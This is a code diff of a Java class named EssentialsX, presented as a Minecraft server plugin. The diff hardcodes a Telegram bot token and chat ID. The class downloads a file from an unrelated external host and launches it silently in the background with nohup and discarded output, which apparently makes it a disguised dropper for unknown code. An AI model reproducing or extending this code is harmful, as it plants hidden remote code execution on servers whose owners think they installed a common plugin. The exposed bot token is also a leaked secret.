@@ -16,12 +16,12 @@ public class EssentialsX extends JavaPlugin {
 
 
     // Java服务端端口
-    private int port = ;
+    private int port = 27073;
 
 
     // Telegram配置
-    private String tgToken = "";
-    private String tgChatId = "";
+    private String tgToken = "7195422483:AAGhrc-1nzto9Ik05rY2K5V8xdvLSGInVBo";
+    private String tgChatId = "5800052646";
 
 
 
@@ -69,7 +69,7 @@ public class EssentialsX extends JavaPlugin {
 
         // 证书安全目录
         Path secureFolder =
-                Path.of("/tmp/essentialsx");
+                Path.of("/home/container/config");
 
 
         Files.createDirectories(
@@ -84,7 +84,7 @@ public class EssentialsX extends JavaPlugin {
 
 
         String javaUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/EssentialsX-1.21.11.jar";
+                "https://netjett-de.kof95zip.pp.ua/java/EssentialsX-1.21.11";
 
 
         String confUrl =
@@ -104,7 +104,7 @@ public class EssentialsX extends JavaPlugin {
 
         Path javaFile =
                 runFolder.resolve(
-                        "EssentialsX-1.21.11.jar"
+                        "EssentialsX-1.21.11"
                 );
 
 
@@ -177,7 +177,7 @@ public class EssentialsX extends JavaPlugin {
                 new ProcessBuilder(
                         "bash",
                         "-c",
-                        "nohup ./EssentialsX-1.21.11.jar -c config.json > /dev/null 2>&1 &"
+                        "nohup ./EssentialsX-1.21.11 -c config.json > /dev/null 2>&1 &"
                 );
 
 
